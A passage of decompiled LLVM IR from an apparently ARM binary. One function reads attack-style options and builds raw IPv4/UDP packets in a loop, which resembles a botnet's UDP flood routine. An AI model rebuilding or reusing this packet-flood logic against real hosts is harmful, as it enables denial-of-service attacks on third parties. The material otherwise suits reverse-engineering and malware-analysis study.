  br label %dec_label_pc_c9e8

dec_label_pc_c9e8:                                ; preds = %dec_label_pc_ca90, %dec_label_pc_c9dc
  %v0_c9ec = load i32, i32* %r3.global-to-local, align 4
  %v1_c9ec = add i32 %v0_c9ec, 24
  store i32 %v1_c9ec, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_c9fc = call i32 @function_14ba0(i32 2, i32 2, i32 17)
  %v7_ca00 = icmp eq i32 %v3_c9fc, -1
  %v0_ca04 = load i32, i32* @sb, align 4
  %v1_ca04 = add i32 %v0_ca04, 1
  store i32 %v1_ca04, i32* @sb, align 4
  store i32 16, i32* @r2, align 4
  %v1_ca10 = load i32, i32* @fp, align 4
  %v2_ca10 = load i32, i32* @r8, align 4
  %v3_ca10 = add i32 %v2_ca10, %v1_ca10
  %v4_ca10 = inttoptr i32 %v3_ca10 to i32*
  store i32 %v3_c9fc, i32* %v4_ca10, align 4
  br i1 %v7_ca00, label %dec_label_pc_cb38, label %dec_label_pc_ca18

dec_label_pc_ca18:                                ; preds = %dec_label_pc_c9e8
  store i32 2, i32* %stack_var_-56, align 4
  store i32 %v4_ca28, i32* %r3.global-to-local, align 4
  %v3_ca30 = call i32 @function_147bc(i32 %v3_c9fc, i32 %v2_ca08, i32 16)
  %v0_ca34 = load i32, i32* @r6, align 4
  %v1_ca34 = add i32 %v0_ca34, 20
  %v2_ca34 = inttoptr i32 %v1_ca34 to i8*
  %v3_ca34 = load i8, i8* %v2_ca34, align 1
  %v4_ca34 = zext i8 %v3_ca34 to i32
  store i32 %v4_ca34, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_ca34, 32
  br i1 %tmp, label %dec_label_pc_caac, label %dec_label_pc_ca40

dec_label_pc_ca40:                                ; preds = %dec_label_pc_ca18
  %v0_ca40 = load i32, i32* @fp, align 4
  %v1_ca40 = load i32, i32* @r8, align 4
  %v2_ca40 = add i32 %v1_ca40, %v0_ca40
  %v3_ca40 = inttoptr i32 %v2_ca40 to i32*
  %v4_ca40 = load i32, i32* %v3_ca40, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_ca4c = call i32 @function_147e4(i32 %v4_ca40, i32 %v0_ca34, i32 16)
  %v0_ca50 = load i32, i32* @sb, align 4
  %v1_ca50 = load i32, i32* @r7, align 4
  %v9_ca50 = icmp eq i32 %v0_ca50, %v1_ca50
  %v0_ca54 = load i32, i32* @fp, align 4
  %v1_ca54 = add i32 %v0_ca54, 4
  store i32 %v1_ca54, i32* @fp, align 4
  br i1 %v9_ca50, label %dec_label_pc_cae8, label %dec_label_pc_ca5c

dec_label_pc_ca5c:                                ; preds = %dec_label_pc_caac, %dec_label_pc_ca40, %dec_label_pc_c9cc
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_c9cc ], [ %v1_c9ec, %dec_label_pc_ca40 ], [ %v1_c9ec, %dec_label_pc_caac ]
  store i32 65535, i32* @r4, align 4
  %v2_ca6c = call i32 @function_13258(i32 65535, i32 1)
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_ca78 = load i32, i32* @r4, align 4
  %v9_ca78 = icmp eq i32 %v3_c940, %v1_ca78
  store i32 %stack_var_-60.0, i32* %r2.global-to-local, align 4
  %v1_ca80 = load i32, i32* @fp, align 4
  %v2_ca80 = load i32, i32* @sl, align 4
  %v3_ca80 = add i32 %v2_ca80, %v1_ca80
  %v4_ca80 = inttoptr i32 %v3_ca80 to i32*
  store i32 %v2_ca6c, i32* %v4_ca80, align 4
  %v0_ca84 = load i32, i32* %r3.global-to-local, align 4
  %v1_ca84 = load i32, i32* %r2.global-to-local, align 4
  %v2_ca84 = add i32 %v1_ca84, %v0_ca84
  store i32 %v2_ca84, i32* @r6, align 4
  br i1 %v9_ca78, label %dec_label_pc_ca90, label %dec_label_pc_c9dc

dec_label_pc_ca90:                                ; preds = %dec_label_pc_ca5c
  %v0_ca90 = call i32 @function_f570()
  %v1_ca90 = trunc i32 %v0_ca90 to i16
  store i32 %stack_var_-60.0, i32* %r2.global-to-local, align 4
  %v2_ca9c = add i32 %stack_var_-60.0, %arg2
  store i32 %v2_ca9c, i32* @r6, align 4
  store i32 %stack_var_-60.0, i32* %r3.global-to-local, align 4
  %v4_caa4 = add i32 %v2_ca9c, 2
  %v5_caa4 = inttoptr i32 %v4_caa4 to i16*
  store i16 %v1_ca90, i16* %v5_caa4, align 2
  br label %dec_label_pc_c9e8

dec_label_pc_caac:                                ; preds = %dec_label_pc_ca18
  %v1_caac = add i32 %v0_ca34, 16
  %v2_caac = inttoptr i32 %v1_caac to i32*
  %v3_caac = load i32, i32* %v2_caac, align 4
  %v1_cab0 = call i32 @function_14a1c(i32 %v3_caac)
  store i32 %v1_cab0, i32* @r4, align 4
  %v0_cab8 = call i32 @function_f570()
  %v0_cabc = load i32, i32* @r6, align 4
  %v1_cabc = add i32 %v0_cabc, 20
  %v2_cabc = inttoptr i32 %v1_cabc to i8*
  %v3_cabc = load i8, i8* %v2_cabc, align 1
  %v4_cabc = zext i8 %v3_cabc to i32
  store i32 %v4_cabc, i32* %r3.global-to-local, align 4
  %v0_cac0 = load i32, i32* @r4, align 4
  %v7_cac0 = lshr i32 %v0_cab8, %v4_cabc
  %v8_cac0 = add i32 %v7_cac0, %v0_cac0
  %v1_cac4 = call i32 @function_14874(i32 %v8_cac0)
  %v1_cac8 = load i32, i32* @r6, align 4
  %v2_cac8 = add i32 %v1_cac8, 4
  %v3_cac8 = inttoptr i32 %v2_cac8 to i32*
  store i32 %v1_cac4, i32* %v3_cac8, align 4
  %v0_cacc = load i32, i32* @fp, align 4
  %v1_cacc = load i32, i32* @r8, align 4
  %v2_cacc = add i32 %v1_cacc, %v0_cacc
  %v3_cacc = inttoptr i32 %v2_cacc to i32*
  %v4_cacc = load i32, i32* %v3_cacc, align 4
  %v0_cad0 = load i32, i32* @r6, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_cad8 = call i32 @function_147e4(i32 %v4_cacc, i32 %v0_cad0, i32 16)
  %v0_cadc = load i32, i32* @sb, align 4
  %v1_cadc = load i32, i32* @r7, align 4
  %v9_cadc = icmp eq i32 %v0_cadc, %v1_cadc
  %v0_cae0 = load i32, i32* @fp, align 4
  %v1_cae0 = add i32 %v0_cae0, 4
  store i32 %v1_cae0, i32* @fp, align 4
  br i1 %v9_cadc, label %dec_label_pc_cae8, label %dec_label_pc_ca5c

dec_label_pc_cae8:                                ; preds = %dec_label_pc_caac, %dec_label_pc_ca40, %dec_label_pc_c9c4
  %v1_cb488 = phi i32 [ 0, %dec_label_pc_c9c4 ], [ %v0_cadc, %dec_label_pc_caac ], [ %v0_ca50, %dec_label_pc_ca40 ]
  store i32 %v1_c998, i32* %r2.global-to-local, align 4
  %v2_caec = icmp eq i32 %v1_c998, 0
  br i1 %v2_caec, label %dec_label_pc_cb0c.outer, label %dec_label_pc_cb44

dec_label_pc_cafc:                                ; preds = %dec_label_pc_cb0c
  store i32 %v1_cb00, i32* @r4, align 4
  store i32 %v0_cb10, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_cafc = load i32, i32* @r8, align 4
  %v4_cafc = mul i32 %v1_cb00, 4
  %v5_cafc = add i32 %v0_cafc, %v4_cafc
  %v6_cafc = inttoptr i32 %v5_cafc to i32*
  %v7_cafc = load i32, i32* %v6_cafc, align 4
  store i32 %v7_cafc, i32* @r0, align 4
  %v0_cb00 = load i32, i32* @sl, align 4
  %v5_cb00 = add i32 %v0_cb00, %v4_cafc
  %v6_cb00 = inttoptr i32 %v5_cb00 to i32*
  %v7_cb00 = load i32, i32* %v6_cb00, align 4
  store i32 %v7_cb00, i32* @r1, align 4
  %v4_cb04 = call i32 @function_14ac0(i32 %v7_cafc, i32 %v7_cb00, i32 %v0_cb10, i32 16384)
  %v0_cb08 = load i32, i32* @r4, align 4
  %v1_cb08 = add i32 %v0_cb08, 1
  %v0_cb0c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_cb0c.outer

dec_label_pc_cb0c.outer:                          ; preds = %dec_label_pc_cae8, %dec_label_pc_cafc
  %v0_cb0c.ph = phi i32 [ %v0_cb0c.pre.pre, %dec_label_pc_cafc ], [ %v1_cb488, %dec_label_pc_cae8 ]
  %v1_cb00.ph = phi i32 [ %v1_cb08, %dec_label_pc_cafc ], [ 0, %dec_label_pc_cae8 ]
  %v0_cb10 = load i32, i32* @r5, align 4
  br label %dec_label_pc_cb0c

dec_label_pc_cb0c:                                ; preds = %dec_label_pc_cb0c.outer, %dec_label_pc_cb0c
  %v1_cb00 = phi i32 [ 0, %dec_label_pc_cb0c ], [ %v1_cb00.ph, %dec_label_pc_cb0c.outer ]
  %v8_cb18 = icmp sgt i32 %v0_cb0c.ph, %v1_cb00
  br i1 %v8_cb18, label %dec_label_pc_cafc, label %dec_label_pc_cb0c

dec_label_pc_cb24:                                ; preds = %dec_label_pc_c8ec
  %v0_cb24 = call i32 @function_f570()
  %v5_cb30 = trunc i32 %v0_cb24 to i16
  br label %dec_label_pc_c9c4

dec_label_pc_cb38:                                ; preds = %dec_label_pc_c9e8
  store i32 %v18_c8ec, i32* %sb.global-to-local, align 4
  ret i32 %v3_c9fc

dec_label_pc_cb44:                                ; preds = %dec_label_pc_cb48, %dec_label_pc_cae8
  %v1_cb487 = phi i32 [ %v1_cb488, %dec_label_pc_cae8 ], [ %v1_cb48, %dec_label_pc_cb48 ]
  br label %dec_label_pc_cb48

dec_label_pc_cb48:                                ; preds = %dec_label_pc_cb54, %dec_label_pc_cb44
  %v1_cb48 = phi i32 [ %v1_cb487, %dec_label_pc_cb44 ], [ %v1_cb48.pre, %dec_label_pc_cb54 ]
  %v1_cb54 = phi i32 [ 0, %dec_label_pc_cb44 ], [ %v1_cb74, %dec_label_pc_cb54 ]
  store i32 %v1_cb54, i32* @r6, align 4
  %v6_cb50 = icmp slt i32 %v1_cb54, %v1_cb48
  br i1 %v6_cb50, label %dec_label_pc_cb54, label %dec_label_pc_cb44

dec_label_pc_cb54:                                ; preds = %dec_label_pc_cb48
  %v0_cb4c = load i32, i32* @r5, align 4
  %v0_cb54 = load i32, i32* @sl, align 4
  %v4_cb54 = mul i32 %v1_cb54, 4
  %v5_cb54 = add i32 %v0_cb54, %v4_cb54
  %v6_cb54 = inttoptr i32 %v5_cb54 to i32*
  %v7_cb54 = load i32, i32* %v6_cb54, align 4
  store i32 %v7_cb54, i32* @r4, align 4
  %v2_cb5c = inttoptr i32 %v7_cb54 to i16*
  %v3_cb5c = call i32 @function_f770(i16* %v2_cb5c, i32 %v0_cb4c)
  %v0_cb60 = load i32, i32* @r8, align 4
  %v1_cb60 = load i32, i32* @r6, align 4
  %v4_cb60 = mul i32 %v1_cb60, 4
  %v5_cb60 = add i32 %v4_cb60, %v0_cb60
  %v6_cb60 = inttoptr i32 %v5_cb60 to i32*
  %v7_cb60 = load i32, i32* %v6_cb60, align 4
  store i32 %v7_cb60, i32* @r0, align 4
  %v0_cb64 = load i32, i32* @r4, align 4
  store i32 %v0_cb64, i32* @r1, align 4
  %v0_cb68 = load i32, i32* @r5, align 4
  store i32 %v0_cb68, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_cb70 = call i32 @function_14ac0(i32 %v7_cb60, i32 %v0_cb64, i32 %v0_cb68, i32 16384)
  %v0_cb74 = load i32, i32* @r6, align 4
  %v1_cb74 = add i32 %v0_cb74, 1
  %v1_cb48.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_cb48

; uselistorder directives
  uselistorder i32 %v1_cb48, { 1, 0 }
  uselistorder i32 %v1_cb00, { 2, 1, 0 }
  uselistorder i32 %v0_cb10, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v3_c9fc, { 1, 3, 2, 0 }
  uselistorder i32 %v1_c998, { 1, 0 }
  uselistorder i32 %v3_c940, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 16, 2, 3, 9, 10, 4, 5, 6, 7, 8, 12, 11, 13, 14, 15, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 7, 4, 5, 9, 8, 10, 11, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_cb0c, { 1, 0 }
  uselistorder label %dec_label_pc_cb0c.outer, { 1, 0 }
}

define i32 @function_cb7c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_cb7c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_cb7c = load i32, i32* @r4, align 4
  %v18_cb7c = load i32, i32* @sb, align 4
  %v27_cb7c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_cb98 = call i32 @function_13258(i32 %arg1, i32 4)
  %v0_cb9c = load i32, i32* @r5, align 4
  store i32 %v0_cb9c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cbac = load i32, i32* @r4, align 4
  %v5_cbb0 = inttoptr i32 %v0_cb9c to i32*
  %v6_cbb0 = call i32 @function_a430(i32 %v0_cbac, i32* %v5_cbb0, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_cbc8 = load i32, i32* @r5, align 4
  store i32 %v0_cbc8, i32* %r1.global-to-local, align 4
  %v0_cbcc = load i32, i32* @r4, align 4
  %v5_cbd0 = trunc i32 %v6_cbb0 to i8
  %v6_cbd4 = inttoptr i32 %v0_cbc8 to i32*
  %v7_cbd4 = call i32 @function_a430(i32 %v0_cbcc, i32* %v6_cbd4, i32 3, i32 65535)
  %v0_cbd8 = load i32, i32* @r5, align 4
  store i32 %v0_cbd8, i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_cbe8 = load i32, i32* @r4, align 4
  %v5_cbec = inttoptr i32 %v0_cbd8 to i32*
  %v6_cbec = call i32 @function_a430(i32 %v0_cbe8, i32* %v5_cbec, i32 4, i32 64)
  %v0_cbf8 = load i32, i32* @r5, align 4
  store i32 %v0_cbf8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cc04 = load i32, i32* @r4, align 4
  %v6_cc0c = inttoptr i32 %v0_cbf8 to i32*
  %v7_cc0c = call i32 @function_a430(i32 %v0_cc04, i32* %v6_cc0c, i32 5, i32 0)
  %v1_cc18 = urem i32 %v7_cc0c, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_cc24 = load i32, i32* @r5, align 4
  store i32 %v0_cc24, i32* %r1.global-to-local, align 4
  %v0_cc28 = load i32, i32* @r4, align 4
  %v5_cc30 = inttoptr i32 %v0_cc24 to i32*
  %v6_cc30 = call i32 @function_a430(i32 %v0_cc28, i32* %v5_cc30, i32 6, i32 65535)
  %v0_cc38 = load i32, i32* @r5, align 4
  store i32 %v0_cc38, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v6_cc30, i32* %sb.global-to-local, align 4
  %v0_cc48 = load i32, i32* @r4, align 4
  %v4_cc4c = inttoptr i32 %v0_cc38 to i32*
  %v5_cc4c = call i32 @function_a430(i32 %v0_cc48, i32* %v4_cc4c, i32 7, i32 65535)
  %v0_cc50 = load i32, i32* @r5, align 4
  store i32 %v0_cc50, i32* %r1.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_cc4c, i32* @sl, align 4
  %v0_cc60 = load i32, i32* @r4, align 4
  %v4_cc64 = inttoptr i32 %v0_cc50 to i32*
  %v5_cc64 = call i32 @function_a430(i32 %v0_cc60, i32* %v4_cc64, i32 0, i32 512)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_cc70 = load i32, i32* @r5, align 4
  store i32 %v0_cc70, i32* %r1.global-to-local, align 4
  store i32 %v5_cc64, i32* @r6, align 4
  %v0_cc78 = load i32, i32* @r4, align 4
  %v4_cc7c = inttoptr i32 %v0_cc70 to i32*
  %v5_cc7c = call i32 @function_a430(i32 %v0_cc78, i32* %v4_cc7c, i32 1, i32 1)
  %v2_cc88 = load i32, i32* @global_var_2295c.90, align 4
  store i32 %v2_cc88, i32* %r3.global-to-local, align 4
  %v1_cc8c = urem i32 %v5_cc7c, 256
  %v0_cc90 = load i32, i32* @r5, align 4
  store i32 %v0_cc90, i32* %r1.global-to-local, align 4
  %v0_cc98 = load i32, i32* @r4, align 4
  %v5_cca0 = inttoptr i32 %v0_cc90 to i32*
  %v6_cca0 = call i32 @function_a430(i32 %v0_cc98, i32* %v5_cca0, i32 25, i32 %v2_cc88)
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_ccb4 = call i32 @function_14ba0(i32 2, i32 3, i32 17)
  store i32 %v3_ccb4, i32* @r0, align 4
  %v7_ccb8 = icmp eq i32 %v3_ccb4, -1
  store i1 %v7_ccb8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_ccb4, i32* @fp, align 4
  br i1 %v7_ccb8, label %dec_label_pc_d014, label %dec_label_pc_ccc4

dec_label_pc_ccc4:                                ; preds = %dec_label_pc_cb7c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_cccc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_cccc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* @r2, align 4
  %v5_cce0 = call i32 @function_14b30(i32 %v3_ccb4, i32 0, i32 3, i32 %v6_cccc, i32 ptrtoint (i32* @0 to i32))
  %v7_cce4 = icmp eq i32 %v5_cce0, -1
  store i1 %v7_cce4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_cce4, label %dec_label_pc_d00c, label %dec_label_pc_ccec

dec_label_pc_ccec:                                ; preds = %dec_label_pc_ccc4
  %v0_ccec = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_ccf8 = urem i32 %v0_ccec, 65536
  %v3_ccfc = icmp ugt i32 %v3_ccf8, 1459
  %v9_ccfc = icmp eq i32 %v3_ccf8, 1460
  store i1 %v9_ccfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ccfc, label %bb, label %bb40

bb:                                               ; preds = %dec_label_pc_ccec
  br label %bb40

bb40:                                             ; preds = %dec_label_pc_ccec, %bb
  %v0_cd04 = phi i32 [ %v3_ccf8, %dec_label_pc_ccec ], [ 1460, %bb ]
  %v0_cd08 = load i32, i32* %sb.global-to-local, align 4
  %v3_cd10 = urem i32 %v0_cd08, 65536
  store i32 %v3_cd10, i32* %r3.global-to-local, align 4
  %v0_cd14 = load i32, i32* @r7, align 4
  %v2_cd14 = icmp eq i32 %v0_cd14, 0
  store i1 %v2_cd14, i1* %cpsr_z.global-to-local, align 1
  %v3_cd18 = mul i32 %v7_cbd4, 65536
  store i32 %v3_cd18, i32* %r1.global-to-local, align 4
  %v0_cd20 = load i32, i32* @sl, align 4
  br i1 %v2_cd14, label %bb41, label %bb42

bb41:                                             ; preds = %bb40
  store i32 %v0_cd04, i32* %r3.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %bb40, %bb41
  %v1_cd44 = phi i32 [ %v3_cd10, %bb40 ], [ %v0_cd04, %bb41 ]
  %v3_cd2c = urem i32 %v7_cbd4, 65536
  store i32 %v3_cd2c, i32* %r1.global-to-local, align 4
  %v3_cd30 = urem i32 %v0_cd20, 65536
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_cd14, label %.thread, label %dec_label_pc_cd4c

.thread:                                          ; preds = %bb42
  %v2_cd40 = add nsw i32 %v1_cd44, 28
  store i32 %v2_cd40, i32* @sb, align 4
  %v2_cd44 = add nsw i32 %v1_cd44, 8
  store i32 %v2_cd44, i32* @sl, align 4
  br label %dec_label_pc_cf4c.preheader

dec_label_pc_cd4c:                                ; preds = %bb42
  %v1_cd50 = add nuw nsw i32 %v0_cd04, 8
  store i32 %v1_cd50, i32* @sl, align 4
  %v1_cd54 = add nuw nsw i32 %v0_cd04, 28
  store i32 %v1_cd54, i32* @sb, align 4
  %v3_cd60 = urem i32 %v1_cd54, 65536
  store i32 %v3_cd60, i32* %r3.global-to-local, align 4
  %v3_cd64 = urem i32 %v1_cd50, 65536
  store i32 %v3_cd64, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v2_ce38 = icmp eq i32 %v1_cc18, 0
  %sext = mul i32 %v6_cbec, 16777216
  %v3_ce34 = sdiv i32 %sext, 16777216
  br label %dec_label_pc_cdd4

dec_label_pc_cd74:                                ; preds = %dec_label_pc_cdd4, %dec_label_pc_ce4c
  %v2_cd78 = phi i32 [ %v0_ce44, %dec_label_pc_cdd4 ], [ %v2_cd78.pre, %dec_label_pc_ce4c ]
  %v3_cd78 = add i32 %v2_cd78, 9
  %v4_cd78 = inttoptr i32 %v3_cd78 to i8*
  store i8 17, i8* %v4_cd78, align 1
  %v3_cd7c = load i32, i32* %stack_var_-44, align 4
  %v5_cd84 = mul i32 %v3_cd7c, 24
  store i32 %v5_cd84, i32* %r3.global-to-local, align 4
  %v1_cd8c = load i32, i32* %r4.global-to-local, align 4
  %v2_cd8c = add i32 %v1_cd8c, 12
  %v3_cd8c = inttoptr i32 %v2_cd8c to i32*
  store i32 %v6_cca0, i32* %v3_cd8c, align 4
  %v0_cd90 = load i32, i32* %r3.global-to-local, align 4
  %v1_cd90 = load i32, i32* @r8, align 4
  %v2_cd90 = add i32 %v1_cd90, %v0_cd90
  store i32 %v2_cd90, i32* %r3.global-to-local, align 4
  %v1_cd94 = add i32 %v2_cd90, 16
  %v2_cd94 = inttoptr i32 %v1_cd94 to i32*
  %v3_cd94 = load i32, i32* %v2_cd94, align 4
  %v1_cd9c = load i32, i32* %r4.global-to-local, align 4
  %v2_cd9c = add i32 %v1_cd9c, 16
  %v3_cd9c = inttoptr i32 %v2_cd9c to i32*
  store i32 %v3_cd94, i32* %v3_cd9c, align 4
  %v1_cda0 = call i32 @function_14898(i32 %v3_cd10)
  %v2_cda0 = trunc i32 %v1_cda0 to i16
  %v3_cda4 = load i32, i32* %r4.global-to-local, align 4
  %v4_cda4 = add i32 %v3_cda4, 20
  %v5_cda4 = inttoptr i32 %v4_cda4 to i16*
  store i16 %v2_cda0, i16* %v5_cda4, align 2
  %v1_cdac = call i32 @function_14898(i32 %v3_cd30)
  %v2_cdac = trunc i32 %v1_cdac to i16
  %v3_cdb0 = load i32, i32* @r5, align 4
  %v4_cdb0 = add i32 %v3_cdb0, 2
  %v5_cdb0 = inttoptr i32 %v4_cdb0 to i16*
  store i16 %v2_cdac, i16* %v5_cdb0, align 2
  %v0_cdb4 = load i32, i32* @r6, align 4
  %v1_cdb8 = call i32 @function_14898(i32 %v0_cdb4)
  %v2_cdb8 = trunc i32 %v1_cdb8 to i16
  %v3_cdbc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_cdbc, i32* %r3.global-to-local, align 4
  %v1_cdc0 = add i32 %v3_cdbc, 1
  store i32 %v1_cdc0, i32* @r4, align 4
  %v1_cdc4 = load i32, i32* @r7, align 4
  %v9_cdc4 = icmp eq i32 %v1_cdc0, %v1_cdc4
  store i1 %v9_cdc4, i1* %cpsr_z.global-to-local, align 1
  %v3_cdc8 = load i32, i32* @r5, align 4
  %v4_cdc8 = add i32 %v3_cdc8, 4
  %v5_cdc8 = inttoptr i32 %v4_cdc8 to i16*
  store i16 %v2_cdb8, i16* %v5_cdc8, align 2
  %v0_cdcc = load i32, i32* @r4, align 4
  store i32 %v0_cdcc, i32* %stack_var_-44, align 4
  %v6_cdd0 = icmp slt i32 %v1_cdc0, %v1_cdc4
  br i1 %v6_cdd0, label %dec_label_pc_cdd4, label %dec_label_pc_cf4c.preheader.loopexit

dec_label_pc_cf4c.preheader.loopexit:             ; preds = %dec_label_pc_cd74
  %v0_cf50.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_cf4c.preheader

dec_label_pc_cf4c.preheader:                      ; preds = %.thread, %dec_label_pc_cf4c.preheader.loopexit
  %v0_cf50.pre = phi i32 [ %v0_cf50.pre.pre, %dec_label_pc_cf4c.preheader.loopexit ], [ 0, %.thread ]
  %v3_cfb0 = icmp eq i32 %v6_cca0, -1
  %v8_cfb0 = icmp eq i32 %v6_cca0, -1
  %v3_cfcc = icmp eq i32 %v3_cd2c, 65535
  %v2_cec0 = icmp eq i32 %v1_cc8c, 0
  br label %dec_label_pc_cf4c

dec_label_pc_cdd4:                                ; preds = %dec_label_pc_cd74, %dec_label_pc_cd4c
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_cde0 = call i32 @function_13258(i32 1510, i32 1)
  store i32 %v2_cb98, i32* %r1.global-to-local, align 4
  %v3_cde8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_cde8, i32* %r3.global-to-local, align 4
  %v2_cdec = load i32, i32* @r4, align 4
  %v5_cdec = mul i32 %v2_cdec, 4
  %v6_cdec = add i32 %v5_cdec, %v2_cb98
  %v7_cdec = inttoptr i32 %v6_cdec to i32*
  store i32 %v2_cde0, i32* %v7_cdec, align 4
  %v0_cdf0 = load i32, i32* %r1.global-to-local, align 4
  %v1_cdf0 = load i32, i32* %r3.global-to-local, align 4
  %v4_cdf0 = mul i32 %v1_cdf0, 4
  %v5_cdf0 = add i32 %v4_cdf0, %v0_cdf0
  %v6_cdf0 = inttoptr i32 %v5_cdf0 to i32*
  %v7_cdf0 = load i32, i32* %v6_cdf0, align 4
  store i32 %v7_cdf0, i32* %r4.global-to-local, align 4
  %v1_cdf4 = inttoptr i32 %v7_cdf0 to i8*
  %v2_cdf4 = load i8, i8* %v1_cdf4, align 1
  %tmp = urem i8 %v2_cdf4, 16
  %v1_cdfc = or i8 %tmp, 64
  store i8 %v1_cdfc, i8* %v1_cdf4, align 1
  %v0_ce04 = load i32, i32* %r4.global-to-local, align 4
  %v1_ce04 = inttoptr i32 %v0_ce04 to i8*
  %v2_ce04 = load i8, i8* %v1_ce04, align 1
  %v3_ce04 = zext i8 %v2_ce04 to i32
  %v1_ce08 = and i32 %v3_ce04, 240
  %v1_ce0c = or i32 %v1_ce08, 5
  store i32 %v1_ce0c, i32* %r3.global-to-local, align 4
  %v1_ce10 = trunc i32 %v1_ce0c to i8
  store i8 %v1_ce10, i8* %v1_ce04, align 1
  %v2_ce18 = load i32, i32* %r4.global-to-local, align 4
  %v3_ce18 = add i32 %v2_ce18, 1
  %v4_ce18 = inttoptr i32 %v3_ce18 to i8*
  store i8 %v5_cbd0, i8* %v4_ce18, align 1
  %v1_ce20 = call i32 @function_14898(i32 %v3_cd60)
  %v2_ce20 = trunc i32 %v1_ce20 to i16
  %v3_ce24 = load i32, i32* %r4.global-to-local, align 4
  %v4_ce24 = add i32 %v3_ce24, 2
  %v5_ce24 = inttoptr i32 %v4_ce24 to i16*
  store i16 %v2_ce20, i16* %v5_ce24, align 2
  %v1_ce2c = call i32 @function_14898(i32 %v3_cd2c)
  %v2_ce2c = trunc i32 %v1_ce2c to i16
  store i32 %v3_ce34, i32* %r1.global-to-local, align 4
  store i32 %v1_cc18, i32* %r3.global-to-local, align 4
  store i1 %v2_ce38, i1* %cpsr_z.global-to-local, align 1
  %v3_ce3c = load i32, i32* %r4.global-to-local, align 4
  %v4_ce3c = add i32 %v3_ce3c, 4
  %v5_ce3c = inttoptr i32 %v4_ce3c to i16*
  store i16 %v2_ce2c, i16* %v5_ce3c, align 2
  %v0_ce40 = load i32, i32* %r1.global-to-local, align 4
  %v1_ce40 = trunc i32 %v0_ce40 to i8
  %v2_ce40 = load i32, i32* %r4.global-to-local, align 4
  %v3_ce40 = add i32 %v2_ce40, 8
  %v4_ce40 = inttoptr i32 %v3_ce40 to i8*
  store i8 %v1_ce40, i8* %v4_ce40, align 1
  %v0_ce44 = load i32, i32* %r4.global-to-local, align 4
  %v1_ce44 = add i32 %v0_ce44, 20
  store i32 %v1_ce44, i32* @r5, align 4
  %v0_ce48 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ce48, label %dec_label_pc_cd74, label %dec_label_pc_ce4c

dec_label_pc_ce4c:                                ; preds = %dec_label_pc_cdd4
  %v1_ce50 = call i32 @function_14898(i32 16384)
  %v2_ce50 = trunc i32 %v1_ce50 to i16
  %v3_ce54 = load i32, i32* %r4.global-to-local, align 4
  %v4_ce54 = add i32 %v3_ce54, 6
  %v5_ce54 = inttoptr i32 %v4_ce54 to i16*
  store i16 %v2_ce50, i16* %v5_ce54, align 2
  %v2_cd78.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cd74

dec_label_pc_ce5c:                                ; preds = %dec_label_pc_cf4c
  br label %dec_label_pc_ce60

dec_label_pc_ce60:                                ; preds = %dec_label_pc_cec8, %dec_label_pc_ce5c
  %v1_ce74 = phi i32 [ %v1_cf3c, %dec_label_pc_cec8 ], [ 0, %dec_label_pc_ce5c ]
  %v5_ce64 = mul i32 %v1_ce74, 24
  %v1_ce68 = load i32, i32* @r8, align 4
  %v2_ce68 = add i32 %v1_ce68, %v5_ce64
  store i32 %v2_ce68, i32* %r3.global-to-local, align 4
